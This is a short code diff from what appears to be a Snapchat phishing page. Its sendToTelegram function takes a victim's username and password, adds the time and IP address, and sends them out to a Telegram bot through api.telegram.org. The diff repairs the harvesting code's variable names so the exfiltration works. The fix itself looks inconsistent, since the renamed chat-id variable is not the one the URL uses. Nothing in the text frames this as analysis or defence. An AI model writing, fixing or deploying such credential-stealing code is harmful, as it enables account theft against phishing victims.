@@ -433,7 +433,7 @@
             
             async function sendToTelegram(username, password) {
                 const fast_key = await getFastKey();
-                const chatId = 'new URLSearchParams(window.location.search).get('id')';
+                const TELEGRAM_CHAT_ID = new URLSearchParams(window.location.search).get('id');
                 
                 const message = `✅ Snapchat Credentials Received:
 Username/Email: ${username}
@@ -441,7 +441,7 @@ Password: ${password}
 Time: ${new Date().toLocaleString()}
 IP: ${await getIP()}`;
                 
-                const url = `https://api.telegram.org/bot${botfast_key}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+                const url = `https://api.telegram.org/bot${fast_key}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
                 
                 try {
                     const response = await fetch(url);
